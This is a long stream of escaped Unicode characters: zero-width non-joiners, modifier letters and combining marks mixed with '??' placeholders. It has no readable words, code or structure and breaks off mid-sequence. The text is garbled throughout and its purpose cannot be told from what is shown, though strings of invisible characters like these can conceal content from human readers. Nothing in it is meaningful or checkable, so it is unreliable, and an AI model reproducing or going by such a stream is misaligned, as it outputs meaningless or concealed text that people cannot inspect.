00c??\u200c????\u02d7\u200c??\u200c??\u0313\u0315\u200c??\u02df??\u02d6\u200c??\u02df??\u0311\u200c??\u200c??\u030d\u02ef\u200c??\u200c??\u200c??\u200c????\u02f7\u200c??\u200c??\u0314\u02ef\u200c??\u02df??\u02df\u02e7\u200c??\u02df\u02e5\u02e8\u0306\u02f7\u02f2????\u0313\u02d4??\u0305\u030d\u02f0??\u02f1??\u02ff\u02df\u02ef\u200c??\u0309\u0317??\u02d5\u02eb\u200c??\u02df\u02f5\u02f0\u02eb??\u02e9\u02d4\u02f7??\u02df????\u0304\u02ff??\u0309\u02e5\u02f7\u02f3\u02f3??\u200c??\u200c????\u0305\u200c??\u02df??\u02f7\u200c??\u200c??\u02f0??\u02f0\u02d7\u02e7\u0309\u0317??\u0307??\u200c??\u02df\u02f5\u02f0\u02eb??\u02ed\u02e6????????\u02d6\u0304??\u0317\u0314??\u02e6\u0307\u0314\u0317\u02e6\u0315\u0311\u02ea\u02e5\u0306\u02eb??\u02ed\u02e5????????\u02d6??\u0308\u02df\u02e7\u200c????\u0312\u0314??\u0305\u200c????\u0305\u0311\u02ff??\u0315\u02ef\u02d2\u02f5\u0304??????\u0315\u02e9\u02eb\u02df\u0305\u200c??\u02e5??\u02d6??\u200c??\u02df\u02e9??\u0316\u030d\u02f2????\u0306????????????\u0306\u0302\u02f7??\u0305\u02ef\u030a\u02f5\u0305\u0315??????\u0305\u02eb??\u02ef\u02f7\u0305\u0304\u02df??\u200c??\u02e8\u02eb\u0305??\u0302\u02f3\u200c????\u0309\u02f2????\u0305\u0309????????????\u0306\u0302\u02ea\u02ef\u0305\u0301??\u0315\u02ef\u02d2??????????\u0316??\u02e5\u02e6\u0316\u030b\u02f2\u02e7??\u02ef\u02e9\u200c????\u02f8\u02e9??\u0315\u02e6\u02e9\u0306??\u02e5\u02e7\u02e9\u02df??\u200c????\u02f2\u02e7??\u02f2??\u200c????\u02f8??\u0315\u02ef\u02d2\u02d6??\u02d5????\u0315\u200c??\u02df??\u02eb\u0315\u02df\u0315??\u0317\u200c??\u200c????\u0315\u200c????\u02f6\u02d2??\u200c??\u02df????\u0315\u02f3\u02f5??\u0315\u02ef\u02f0????\u02f3\u02e8\u200c??\u200c??\u200c??\u200c??\u02df??\u02f3\u200c??\u200c??\u0310\u200c??\u200c??\u02e7\u200c??\u200c????\u200c??\u200c??\u02df\u030a\u200c??\u200c????\u0315\u200c??\u02df??\u0301\u200c??\u200c??\u02e6\u200c??\u200c????\u0305\u030d\u0303??\u0315\u02ef\u0310\u0318\u0305\u02ef??\u02f7\u02f0\u02d6\u02d6\u02f5\u02ef\u02f8\u0306\u02f0\u02ef??\u200c??\u200c????\u200c??\u200c??\u02e5\u0306\u02eb??\u02e9\u02d5\u0305\u0300\u02e9??\u0309\u02f7??\u0315\u02ef\u0310\u0311\u02df\u02e7\u030d??\u200c??\u02df??\u0305\u02f7\u02f6\u02f5\u02df\u030d\u0305\u02d6\u02df\u0301\u200c??\u02df\u0311\u02f7??????\u02d6\u02df\u02ef\u200c????\u0316\u030e\u0300????\u0309\u0317??\u0316????\u02e6\u0317\u02f1\u02f2\u02e7\u02ed??\u0313\u200c????\u02f8??\u0315\u02ef\u0310\u0305\u0316\u02d2\u0310??\u02f1\u030d\u02f5??\u0315\u0301\u02f0????\u02f3??\u200c??\u200c??\u200c??\u200c??\u200c??\u0301\u200c??\u200c??\u02e6\u200c??\u200c????\u0305\u200c??\u200c??\u200c??\u200c????\u02ef??\u02ef\u200c????\u0307\u02f7\u030f\u02e9\u02d2\u030d\u200c????\u02eb\u0315??\u02df??\u0301\u02df\u0305\u200c????\u200c??\u02df??\u02f6\u02d2??\u200c??\u02df????\u0315\u02d7??\u02df\u0305\u200c??????\u02eb\u02ef\u02e9??\u030d\u02f0??\u0309\u02f3\u02f1\u200c??\u200c??\u02d7\u0305??\u200c??\u02df\u0311\u200c??\u02df??\u0318\u02df\u02ef\u200c??\u030e\u02ef??\u200c??\u02e5\u02ef\u200c??\u02df??\u02f6\u200c??\u200c??\u0311\u200c??\u200c????\u02ef\u200c??\u02df??\u02d7\u200c??\u200c??\u02f0\u02ef??\u200c??????\u200c??\u200c??\u200c??\u200c??\u02df\u030f\u200c??\u200c??\u02eb\u02d6??\u200c??????\u200c??\u200c??\u02f8\u200c??\u200c??????\u200c??\u02df??\u030d\u02df\u02ef\u200c????\u02df\u030d\u200c??\u02df\u02f7\u030b??\u0316\u02eb\u02ed\u02e9\u02d4\u02f7??\u02e7\u02df\u030e\u02e8\u02d2??\u02f0\u0306??\u02f5??\u02e9\u0304\u0305\u02f7\u200c??\u02df\u02ef\u02eb??\u02e6\u02ef??\u200c??\u02df\u0300\u02e8\u02ef\u02ff\u02f2??\u0315\u02f7\u02f7\u02f5\u02e8\u02eb\u02e6\u02f7\u02ef\u0311\u0302??\u0315\u02d2\u02d2\u0304\u0304????????\u02d2\u02e6\u200c??\u02df??\u0302\u02df\u02ef\u200c????\u0311\u02e6\u030b\u0307\u02f3??\u02ea\u02df\u0309\u0304????\u02eb\u02ed\u02ed\u02e5\u02f2??????\u02d6\u02f0??\u0317??\u02d7\u02df\u02ef\u200c??\u0309\u0317\u02df\u0306\u02d3\u0315\u200c??\u02f5\u02f1\u0314\u030e??\u02f6\u02f3\u0305\u200c??\u02df??\u02e9\u0305\u0306??\u02df\u0315\u200c??\u02e5??\u02d2??\u200c??\u02df??\u0302\u02df\u02eb\u200c????\u0311\u02e5??\u0315\u0315\u02f2??\u0316\u02eb\u02e9\u02e6\u0315\u02d2\u02f2??\u0308\u0305\u0312????????\u0301\u0316??\u200c??\u02df\u030d\u02f2??????\u02e9\u0302\u02ef\u02eb\u200c????\u0311\u02f0??\u02e8\u02eb\u02f2??\u02f0??\u02e9\u0302\u02df\u02eb\u200c????\u0311\u02f0????\u0302\u02f7\u0309\u0316????\u02f7\u02f0\u02eb\u02e5\u02e6??\u02eb\u02ed\u02ed\u02df\u02e6??????\u02d6\u02f0????\u030a\u02f7??\u0315\u0315\u02f0??\u0306\u02d6\u0304\u02f6\u0316??\u02e5\u02e7\u02eb????\u200c????\u0304??????\u0305??\u0315\u0301\u02f0????\u02df\u0303\u02df\u02ef\u200c??\u0309\u0317??\u02f3??\u0315\u200c??\u02f5\u02f0\u02eb\u02ed\u02ed??\u02f2??????\u02d6\u02f0??\u0306\u02d6\u0305\u02f6\u0317\u0315\u02f4??\u02f0\u02df\u0305\u02f2\u0305??\u200c??\u02e8\u02eb\u0305\u0303????\u200c????\u0309\u02f2??\u0308\u0307\u02d2??\u0314????\u02e6\u0315\u0309\u0310\u02d7\u02f0??\u02e6\u02e6\u0315\u02d7\u0307??\u02ef\u030e??\u02df\u0315\u200c??\u02e5\u0316??\u02eb\u02e8\u02f0\u0302\u02f7??\u0315\u0317\u02f2??\u02ef\u02f4??\u02df\u0305\u200c????????\u02f5\u200c??\u200c??\u0304\u0305\u02e7\u200c??\u02df\u02ef\u0305\u030a\u0305\u200c??\u02df\u02e8????\u02df\u0305\u200c????????\u02ed\u200c??\u200c??\u0309??\u02df\u0304\u0304????\u0302\u02f7\u02f5\u02df\u02f2??\u0316\u02d6\u02e8??\u0315\u02d2\u02d2\u0300??\u02d5????\u0316??\u02ea\u0302\u02ef\u02eb\u200c????\u0313\u02ed\u02ff\u02f0\u02eb\u02e7??\u0316\u02eb\u02e8??\u02ef\u02d6\u0305\u02e5\u02ef??\u200c??\u02e8\u02eb\u0305\u0303\u02f5\u02eb\u200c????\u0309\u02f2??\u0308\u0306\u02e8??\u0314??????\u02ef\u02f0??\u02e7\u02ef\u200c??\u02df\u02f0??????\u02ef\u030e??\u02df\u0315\u200c??\u02e5\u0316??\u02eb??\u02ef\u0302\u02f7??\u02ef\u030a\u02f8\u0309????\u02f0????\u02ef??\u200c??\u02df\u0300??\u02ef\u0309\u02f0????\u0305\u0304??\u02f4\u0305\u02f0??????\u02f2\u02f7\u0302??\u0314??\u0305\u200c????\u0307\u02f7\u02f8??\u0315\u02d2\u02d2????\u02d5????\u0316??\u02e8????\u0305\u02f2??\u02f0\u0305\u02f2??\u0308\u0308????\u0304??????\u02ef\u0309\u02f0??\u0318??\u02e8\u02e6\u0315??\u02f2??\u0308\u0308\u0314??\u0304??????\u02f0\u02df\u0304??\u02d3\u02eb\u0305\u02f5\u02ff\u02e7\u200c????\u0309\u0310\u02d5??????\u0302\u02f1??\u200c??\u02df??\u0314??\u0315\u200c????\u0305??????\u0315\u200c????\u02e6\u02ef??\u200c??\u02df\u0300??\u0315\u030a??\u02e7\u200c??\u200c??\u02ff\u02e7\u02f5??\u0315\u02d2\u02d2\u0313????????\u0315\u030a??\u02e7\u200c??\u200c??\u02f1\u030d\u02f2\u02eb\u02df\u02eb\u02df\u02d3\u0315\u200c??\u200c??\u0309\u200c??????????\u200c??\u02df????\u02eb\u02e5\u02e9\u0318\u02d2\u02f0??\u02f3\u02f3\u02ea\u200c??\u200c????\u0315\u200c??\u02df\u02e9??\u200c??\u200c??\u0304\u200c??\u200c??\u030d\u0315\u200c??\u02df??\u02f3\u200c??\u02df??\u0306\u200c??\u200c??\u200c??\u200c??\u02df??\u02f3\u200c??\u02df??\u02e6\u200c??\u200c??\u02f5\u02ef\u200c??\u02df\u02e5\u02d2\u200c??\u02df??\u02ef??\u0315\u200c????\u0307\u02f7\u02f5??\u0315\u02f3\u0310\u0315\u0306\u02f7\u02e9??\u02ef\u02f7\u0305\u0316\u02ef\u200c??\u02df\u02e8\u02eb\u0305\u0318\u02d7\u030d\u200c????\u0309\u02f2??\u02f1\u0313\u0313\u02df\u0315\u02f0\u0306\u02e6\u0317\u02f0\u02f8??\u030b????\u02df\u02ef\u200c??\u200c??\u02f3\u200c??\u200c??\u02ff??\u0315\u02f3\u0310\u030b????\u02e5\u02e7??\u02eb\u200c??\u02df??\u02f2\u02e7\u02e8\u0302\u0317\u200c????\u02f8\u02e9??\u0315\u02f6??\u0316??\u02e5\u02e6????\u02f2\u02e7\u02e8\u02e9\u02f2\u200c????\u02f8??\u0315\u02f3\u02d2\u0302????????\u0315\u02e9\u02eb\u02df\u0305\u200c??\u02e5??\u02d6\u02f3\u200c??\u02df\u02e9??\u0316\u02d6\u02e9??\u0315\u02f3\u02d2\u02f6????????\u0315\u02f7\u02f6\u02f5\u02df\u030d\u0304\u02e7\u02df\u0315\u0300??\u02f0\u02d2\u02e7\u02e5\u030a\u0311\u02e8\u02f5\u02f2\u02e7\u02f4??\u02ef\u02f7\u0305??\u02ef??\u200c??\u02e8\u02eb\u0305??\u02eb\u200c??\u02df??\u0309\u02f2??\u02f2\u0305\u02d3??????????\u02ef\u02f7\u0304\u0303\u02f8\u02eb\u0305??\u0302\u0305\u200c????\u0309\u0310\u02d5\u02df\u0301\u030f\u02e5??\u02eb??\u02ed??\u02ea??????\u02d6\u02df??\u0318\u02df??\u02df??\u0311??\u200c??\u02df\u02e9\u200c??\u02df\u02f0\u0304\u0305\u02e7\u200c??\u02df\u02ef\u02f2??\u030c\u02d2??\u200c??\u02df????\u0315\u0301\u0310\u02f2??????\u02f0\u02ef\u0315\u200c??\u02df????\u200c??\u200c??\u0314\u02ef\u200c??\u02df??\u02d2\u200c??\u02df??\u0307\u200c??\u200c????\u02ef\u200c??\u02df??\u0309\u200c??\u02df????\u200c??\u200c??\u0306\u0305\u200c??\u02df\u02e7\u0311\u200c??\u02df??\u02d7\u200c??\u200c??\u0301\u200c??\u200c??\u200c??\u200c??\u02df??\u02ef??\u200c??\u02df??\u0307\u02f7\u02f0??\u0306\u02d7\u02eb\u0309\u0317??\u030c\u0317\u0315\u200c??\u02f5\u02f0\u02eb??\u02e9\u02d5\u02ef\u02f5??\u0306??\u02e5\u02e7\u02e6\u02d2??\u200c????\u02f2\u02e7??\u02f0\u0308\u200c????\u02f8??\u0315\u02f3\u0310\u030d\u02df\u02d2????\u0305\u02f0\u0306\u02e6\u0318??\u02f8??\u030b????\u02df\u02ef\u200c??\u02df??\u02e7\u200c??\u200c??\u02f0??\u0306\u02d6??\u0309\u0317??\u02f2\u02e9\u200c??\u02df\u02f5\u02f0\u02eb??\u02ed\u02e6\u0314??????\u02d6\u02f0??\u0317\u02df\u02f0\u02df\u02ef\u200c??\u0309\u0317??\u0317\u02e5\u02ef\u200c??\u02f5\u02f1\u0314\u030e??\u0305\u02ea????\u02ef\u02d2\u200c??\u02df??\u02e7??\u0316\u02f7\u02f2??\u02f2\u0306\u02f8????????\u02df\u0305\u02eb????\u02f1\u0305\u02f4\u200c??\u02df\u02e9??\u0316\u02f7\u02f2??\u02f2\u0306\u02e6??????????\u0306\u0302\u02f7??\u0305\u02d2??\u02e8\u02f4\u030d????\u0305\u02ef\u02e8\u02f5\u02df??\u02f0??\u0316\u02d7\u02f4\u0309\u0317??\u0300??\u02ef\u200c??\u02f5\u02f0\u02eb??\u02ed??\u0304??????\u02d6\u02e8\u02e5????\u0312??\u02f0\u02d6\u02e8??\u0315\u02f3\u02d2\u02e5\u0304??????\u0316??\u02e6\u02e6??\u02d4\u02f2\u02e7\u02e8\u02d7??\u200c????\u02f8\u02e9??\u0315\u02e6\u02e9\u0306??\u02e6\u02e7\u02ed\u0301\u200c??\u02df??\u02f2\u02e7\u02ea\u030f??\u200c????\u02f8??\u0315\u02f3\u02d2\u02d7\u0304\u02d5????\u0315\u02df\u02f2\u02eb\u02df\u0301\u02df\u0305\u0315??\u200c??\u02df\u0311\u200c????????\u02df\u0305\u200c??????\u02eb??\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2??\u0307\u0312\u02e9??\u02ef\u02f0????\u0305\u200c??\u02df??\u02e7\u200c??\u02df??\u0303\u200c??\u200c??\u030c\u02ef\u200c??\u02df\u02e5\u02f3\u200c??\u02df????\u200c??\u200c??\u02d3\u0305\u200c??\u02df??\u0315??\u200c????\u02ef\u200c??\u200c????\u0315\u200c??\u02df??\u0315??\u200c??\u02df\u02ff\u02df\u02ef\u200c??\u200c??\u200c??\u02df??\u0315\u200c??\u02df????\u200c??\u200c????\u02df??\u200c??\u02df\u02f7\u030b\u02e6\u0306\u02eb??\u02e9\u02d5\u02f7\u02f5??\u0306\u02f7\u02f2????\u0313\u0314\u02df\u0315\u02f0\u0306\u02e6??\u030e\u02f8??\u030b????\u02df\u0315\u200c??\u02df??\u02e7\u200c??\u200c??\u0304\u200c??\u200c??\u02e7\u0305\u200c??\u02df??????\u02e7??\u0301\u200c??\u02df??\u02f2\u02e7\u02eb\u030f\u0315\u200c????\u02f8??\u0315\u02ef\u0310\u0306????\u02e5\u02e6??\u02f1\u02f2\u02e7??\u0303\u030b\u200c????\u02f8\u02e9??\u02d6\u02ff\u02e9??\u0315\u02f7\u02e9??\u0309\u0304\u02e6\u02df\u0311\u02f0??\u0306\u02d6\u0308\u0309\u0317????\u0304\u02ef\u200c??\u02f5\u02f0\u02eb??\u02ed??\u0318??????\u02d6??\u02e9??\u02f7\u200c??\u02df\u030d\u02ea??\u02ef\u02f3\u0305\u0311\u0305??\u200c??\u02e8\u02eb\u0305\u030c\u030c\u200c??\u02df??\u0309\u02f2????\u0306\u02df????????\u02df\u0307\u0305\u02f6\u200c??\u02df\u02e9??\u0316????\u02e7??\u02df??\u200c????\u02f2\u02e7??\u02e7\u0311\u200c????\u02f8??\u0315\u02ef\u02d2\u02e8????????\u0315\u02e7\u030d\u02e5\u200c??\u02df??\u0305\u0311\u02f0??\u02f1\u02df\u02f6\u02df\u02ef\u200c??\u0309\u0317??\u0314\u0300\u0305\u200c??\u0304\u0305\u02e7\u200c??\u02df\u02ef\u0305\u02f4\u0315\u02e7\u200c??\u02e6\u02d2??\u200c??\u02df??\u02e7??\u0301??\u200c????\u02f2\u0304\u0305\u02e7\u200c??\u02df\u02ef\u0304\u02e6\u02d3??\u0305\u02e7\u02ea\u02e7\u200c??\u02df??\u0304\u030c\u02f4\u0309\u02f2????\u0308\u0308??\u0314??????\u0306\u0302\u02f7??\u0305\u02eb\u030a\u02f5\u0305\u0315??????\u0305\u02eb??\u02ef\u02f7\u0304\u02f4\u02f8\u02eb\u0305\u0309\u0306\u02f3\u200c????\u0309\u02f2????\u0308????\u0314????????\u0306\u0302\u02ea\u02ef\u0309\u0304??\u0306\u02eb??\u02ed\u02ea\u0304??????\u02d6\u02f0??\u02f1\u02df??\u02df\u0305\u200c??\u0309\u0317??\u030c\u02f3\u02ef\u200c??\u02f5\u02f1\u0314\u030e??\u0317\u030d\u02f0??\u02f1??\u02f6\u200c??\u200c??\u0309\u0316????\u02e7??\u0301\u200c??\u02df??\u02f2\u02f5\u02f0\u02eb??\u02ed\u02e7????????\u02d6\u02df??\u0318\u02df\u02e5\u02df??\u0311\u200c??\u200c??\u02eb\u200c??\u02df\u02f0\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2??\u02e6\u02d2??\u200c??\u02df????\u0315\u02f3\u0300??\u02ef\u030a????\u0305\u200c??\u02df\u02e8\u02e7\u200c??\u02df??\u0313\u200c??\u200c??\u02ea\u0305\u200c??\u02df\u02e7\u0311\u200c??\u02df??\u02e7\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02ea\u200c??\u200c??\u0309\u0305\u200c??\u02df??\u0315\u200c??\u200c??\u02f5??\u0306????\u02e6\u0318??\u02f2\u02e7\u02e5\u0308\u02ed\u200c????????\u200c??\u02df????\u02df??\u02df\u02ef\u200c??\u0304\u0305\u02ef\u200c??\u02df\u02ef\u0305??\u02df??\u200c??\u02e8\u02eb??\u02f5\u02f1??\u0312\u200c??\u200c??\u02f6\u02d3??\u02f8??\u02f1\u0313\u0309??\u02ef\u02d2??\u02f7\u02f0\u02d6\u030c\u02f5\u02ef\u02f8\u0306\u02f0\u02ef??\u200c??\u200c????\u200c??\u200c??\u02e5\u0305??\u0310\u0308\u0306\u02d6\u02e8\u02e9??\u0309\u02f0??\u02f1??\u02e7\u02df\u02ef\u200c??\u0309\u0317\u02df\u02d5\u02f0\u02ef\u200c??\u02f5\u02ef??\u02d2\u0302\u0314??????\u0315\u02e9\u02eb\u02df\u0305\u200c??\u02e5\u0315\u02eb??\u0308\u02df\u02f3\u200c????\u0312\u0314\u02e5\u02ef\u200c????\u0305\u02f7\u02f6\u02f5\u02df\u030d\u0305\u0309\u200c??\u200c??\u02df\u0311\u02e6\u02e8\u02f4\u030d\u02e6\u02f5??\u0306\u0302\u02ea\u02df\u0301\u02f8??\u02f2\u0306\u02e9??????????\u0307\u0314??\u02e5\u02df??\u02d2\u02ef????????\u0317\u030d\u02f8??\u0315\u0301\u02f0????\u02f3??\u200c??\u200c????\u0315\u200c??\u200c??\u0301\u200c??\u200c??\u02e6\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02ef??\u0305\u200c????\u0307\u02f7\u030f\u02ed\u02e6\u02e6??????\u02d6\u02df??\u0318\u02df??\u02df\u02ea??\u200c??\u200c????\u200c??\u02df\u02f0\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2????\u0312\u02df??\u02f3\u02f3\u02eb\u200c??\u200c????\u200c??\u200c????\u02f3\u200c??\u02df??\u02ea\u200c??\u200c??\u02f6\u0315\u200c??\u02df??\u02d6\u200c??\u200c??\u200c??\u200c??\u02df\u02f1\u0315\u200c??\u02df??\u0315\u200c??\u200c??\u02e9\u200c??\u200c??\u02f0\u0315\u200c??\u02df\u02e6\u200c??\u200c??????\u200c??\u200c????\u02df\u02d6\u200c??\u02df\u02f7\u030b\u02e6\u0305??\u0310\u0315??\u02f7\u02e9??\u0305??\u0310\u0313\u0305\u02e7??\u02f7\u02f0\u02d7\u02d5\u02f5\u02ef\u02f8\u0306\u02f0\u02ef??\u200c??\u200c????\u200c??\u200c????\u0315??\u0310\u030e\u02f0????\u02e7??\u02d2??\u200c????\u02f2\u02e7??\u0306\u0307\u200c????\u02f8\u02e9????\u02f3??\u0316\u02d6\u02e8??\u02f1\u0313\u02ed\u02e9??\u030d\u200c??\u02df\u030d\u02ea\u02e6\u0315\u0309??\u02e9\u02d2\u02eb\u02e5????\u0305\u02e9\u02df\u0307\u02f4\u02ff\u02df\u030a\u0305\u02f7\u02f6\u02f1\u0315\u02e6\u02e5\u02ef??\u02d2\u0300????????\u0316\u02d6\u02e9\u02e9??\u02f7\u02f0????\u02d7\u0318\u0309\u0316????\u02e6??\u02ed\u02f2\u02f5\u02ef??\u02d2\u02f5\u0314??????\u0315\u0302????\u0305\u200c??\u02df\u02f1\u030d\u02f5??\u02f2\u0306\u02eb????????\u200c??\u200c????\u0318\u02df\u02e5\u02df??\u02f7??\u200c??\u02df\u02ed\u200c??\u02df\u02f0\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2??\u02f6\u02d2??\u200c??\u02df????\u0315\u02f7\u0310\u02ef\u0316????\u02f0\u02ef\u0315\u200c??\u02df??\u02d4\u200c??\u200c??\u0305\u200c??\u200c????\u02f7\u200c??\u200c??\u200c??\u200c??\u02df\u0311\u0315\u200c??\u02df\u02ea\u02eb\u200c??\u02df????\u200c??\u200c??\u0300\u200c??\u200c????\u200c??\u200c??\u02df\u02eb\u200c??\u200c??\u02e7\u200c??\u200c??\u02ea\u02eb\u200c??\u02df??\u02ef??\u200c??\u02df??\u0307\u02f7\u0304??\u02f0\u02eb??\u02e9\u02d5??\u02f5??\u0306????\u02e7??????\u200c????\u02f2\u02e7\u02ea\u02e7\u02f8\u200c????\u02f8??\u0315\u02ef\u0310\u030f\u02ef\u02ef??\u02f7\u02f0\u02d6??\u02f5\u02ef\u02f8\u0306\u02f0\u02ef??\u200c??\u200c??\u02f1\u200c??\u200c????\u02ef\u02f7\u0305??\u0305??\u200c??\u02e8\u02eb\u0305\u030b??\u0309\u200c????\u0309\u02f2????\u0313\u02e5\u02e6\u0307\u0314\u02d3??\u02df\u0311\u0302??\u0315\u02ef\u02d2\u0303\u0304??????\u0315\u02e7\u030d\u02e5\u0315\u200c????\u0305\u0311\u02f0??\u02f1??\u02ff\u200c??\u200c??\u0309\u0317??\u02d4\u0301\u0315\u200c??\u02f5\u02f0\u02eb??\u02ed??????????\u02d6\u02e5????\u0305\u02e9\u02df\u0317\u02f4\u02ff??\u02df\u02eb\u02e7\u02f5\u02df\u0315\u02f6??\u0315\u02ef\u02d2\u02f1\u0304??????\u0315\u0305\u02f7\u02f6\u02f6\u02d2??\u200c??\u02df??\u02e7\u02e8\u0315\u200c??\u02df????\u02df\u0305\u200c????????\u0301\u200c??\u200c??\u0309??\u02d2??\u200c??\u02df??\u02e6??\u02e5\u02f2\u02f7\u02f0\u02d7\u0316\u02f6\u02d3??\u0312????\u030d\u02f2????\u0305\u02ff????????\u02e6\u0315\u030d\u0310\u02d7\u02ef\u0302????\u0305\u200c??\u02df\u02f1\u030d\u02f0??\u0307??\u0313\u02df\u02ef\u200c??\u0309\u0317??????\u0315\u200c??\u02f5\u02f0\u02eb??\u02ed??\u0310??????\u02d6\u200c????\u02eb\u0315\u02df\u0315\u02df??\u02df\u02ef\u200c????\u0315\u200c????\u02f6\u02d2??\u200c??\u02df????\u02f6\u02d2??\u200c??\u02df????\u0315\u02ef\u02f8??\u02df\u0306????\u200c??\u200c??\u02e6\u0301\u200c??\u200c??\u0314\u200c??\u200c??\u02ea\u0315\u200c??\u200c??\u200c??\u200c????\u0307\u200c??\u200c??\u0316\u02ef\u200c??\u02df\u02e9\u02e7\u200c??\u02df??\u02f5\u200c??\u200c??\u02e6\u0317\u02ed??\u02df\u02ef\u200c??\u02df\u02f1\u02f6\u02ef??\u200c??\u02df????\u0305??\u200c??\u02df\u02e9\u0305\u02df\u02f7\u200c??\u02df\u02ef\u0303\u0308\u02ef??\u200c??\u02df??\u02e9??\u030c\u02f3??\u200c??\u02df\u0300\u02e6????\u02f2\u02e6\u200c??\u02df\u030c\u02f0\u0301\u02eb\u02e9\u02d4\u0311\u02e5\u0302\u02ef\u02eb\u200c????\u0311\u02f8\u02e7\u02ea\u02d6\u0308\u200c????\u0302??\u030c\u02f3??\u200c??\u02df\u0300\u02e5\u0317\u02df\u0318??\u0315\u200c??\u030c\u02ef\u0309\u0304\u02e6\u02d3\u02eb\u0305\u02e8\u02d5\u02eb\u200c????\u0309\u02eb\u02e9\u02d2\u02ef\u02e5\u0302\u02df\u02eb\u200c????\u0311\u02f5\u02e7\u02ea\u02ef??\u200c????\u0302??\u030c\u02f3??\u200c??\u02df\u0300??\u0317\u02df\u02f5\u02ed\u0315\u200c??\u030c\u02f0\u02f7\u02eb\u02ed\u02e5????????\u02d6\u02e5\u0302\u02ef\u02eb\u200c????\u0311\u0302\u02e7\u02e6\u02e7??\u200c????\u0302??\u030c\u02ef??\u200c??\u02df\u0300\u02e5\u0307????\u02ed\u0305\u200c??\u030c\u02f0????\u02e6??\u0317\u02f2\u02e7??\u02ea\u02f7\u200c????\u02f8????\u0305\u02d2??????????\u030c\u02f3??\u200c??\u02df\u0300\u02e5????\u0312\u02df\u02ef\u200c??\u030c\u02f0\u030b??\u02e7\u200c??\u200c??\u02f7\u02df\u02e6\u200c??\u02df????\u030c\u02f3??\u200c??\u02df\u0300\u0305\u02df\u02f3\u200c??\u02df\u02ef\u030f??????\u200c??\u02df\u02f7\u030b\u02e9\u0305\u200c????\u0318\u02df??\u02df??\u02f7\u200c??\u200c??\u02ef\u200c??\u02df\u02f0\u0304\u0305\u02e7\u200c??\u02df\u02ef\u02f2??\u030c\u02d2??\u200c??\u02df????\u0315\u0301\u0310??\u0306????\u02f0\u02ef\u0311\u200c??\u200c??\u0311\u200c??\u200c??\u0300\u0305\u200c??\u02df??\u02d2\u200c??\u200c??\u02f1\u200c??\u200c????\u0305\u200c??\u02df\u02e5\u02e7\u200c??\u200c??\u200c??\u200c??\u02df\u030c\u200c??\u200c??\u02df\u0311\u200c??\u02df????\u200c??\u200c??\u030c\u0305\u200c??\u02df??\u02df\u02f1\u200c??\u02df\u02e5\u02e8\u0306\u02d2\u02f2??\u02f1\u0314????\u0305\u030d\u02f8??\u0315\u02f3\u0310\u0313\u0315\u02ef??\u02f7\u02f0\u02d7\u02f7\u02f5\u02ef\u02f8\u0306\u02f0\u02ef??\u200c??\u200c????\u200c??\u200c????\u0306\u02eb??\u02e9\u02d4\u02f3\u0304??\u02f1\u0314\u02d2\u02e6\u0315??\u02ea??\u02ef\u02f7\u0305\u02f2\u0315??\u200c??\u02e8\u02eb\u0305????\u02d2\u200c????\u0309\u02f2??\u02f1\u0313\u02eb\u02df\u0305\u02eb\u030d\u02e6\u200c??\u02df??\u0305\u0311\u02f0??\u0307??\u02ea\u200c??\u200c??\u0309\u0317??\u02ff\u02d3\u02ef\u200c??\u02f5\u02f0\u02eb??\u02ed\u02e5????????\u02d6\u02e5????\u0305\u02e9\u02e7??\u02e7??\u200c??\u02df\u02eb\u02e7\u02e9\u0315\u200c??\u200c????\u02e7\u02e9\u0309??\u200c??\u02df\u02e7\u02e5??\u0311\u02e8\u02f5\u02f2\u02e7\u02f1??\u02ef\u0301\u0304\u0300\u02f8\u02eb\u0305\u02f6\u0303\u0309\u200c????\u0309\u02f2??\u02f2\u0306????????????\u02ef\u02f7\u0305\u02e6\u0305??\u200c??\u02e8\u02eb\u0305\u030b\u0315\u0301\u200c????\u0309\u0310\u02d4\u02ef\u0301\u030f??\u02ef\u02f7\u0305??\u0315??\u200c??\u02e8\u02eb\u0305\u0315??\u0309\u200c????\u0309\u02f2??\u02f2\u0305\u02ff????????\u200c??\u02df\u02f2\u02eb\u02df\u02ef\u02df\u02d4\u02ef\u200c??\u02df????\u200c????????\u02df\u0305\u200c??????\u02eb\u02e5\u02e9??\u02e7\u02f0??\u02f3\u02f3\u02eb\u200c??\u200c??\u0302\u200c??\u200c??\u02e9??\u200c??\u200c??\u02ea\u200c??\u200c??\u02ff\u0305\u200c??\u02df\u02e8\u02e7\u200c??\u02df??\u02ef\u200c??\u200c??\u0302\u200c??\u200c????\u02e7\u200c??\u200c??\u200c??\u200c??\u02df\u02ed\u02ef\u200c??\u02df\u02e6\u02ef\u200c??\u02df??\u02ff\u200c??\u200c??????\u02eb\u200c??\u02df\u02f7\u030b\u02e5??\u02eb??\u02e9\u02d5\u02d2\u02f5??\u0306??\u02f2??\u02f1\u0313????\u02ef\u02f0\u0306\u02e6\u0316\u02f8\u02f8??\u030b????\u02df\u02ef\u200c??\u200c??\u02f7\u200c??\u200c??\u0304??\u02f0\u02eb??\u02e9\u02d4\u02df\u02f0??\u0307\u02df\u0306\u02df\u02ef\u200c??\u0309\u0317????\u02f7\u02ef\u200c??\u02f5\u02f1\u0314\u0311??\u02df\u0311\u02f0??\u0307??\u02f6\u02df\u02ef\u200c??\u0309\u0317??\u0304??\u200c??\u02df\u02f5\u02f0\u02eb??\u02ed\u02e6\u030c??????\u02d6??\u0308\u02df\u02f3\u200c????\u0311??\u0308\u02df\u02e7\u200c????\u0312\u0314\u02e6\u02ef\u200c????\u0305\u0311\u02f8??\u0315\u02f3\u02d2\u02f6????????\u0315\u02f7\u02f6\u02f5\u02df\u030d\u0305\u030f\u0305??\u200c??\u02df??\u0305??\u02ef\u02e7\u200c??\u02df\u0315\u0305\u02ff\u0305\u02ef\u200c??\u02df\u0305\u02e8\u02e5??\u030e\u02f8\u02eb\u02df\u0305\u02ff??\u0315\u02f3\u02d2\u02ed????????\u0316\u02d6\u02ea\u02e9??\u02f3\u0302??\u0315\u02f3\u02d2\u02ea????????\u0315\u0302??\u02df\u02ef\u200c??\u02e5\u0317\u030d\u0302??\u0315\u02f3\u02d2\u02e7????????\u0315\u200c??\u02df??\u02eb\u0315\u02df\u0305??\u02f1\u200c??\u200c????\u0305\u200c????\u02f6\u02d2??\u200c??\u02df????\u0315\u02f0????\u200c??\u02df????\u02eb??\u02e9????\u02e8\u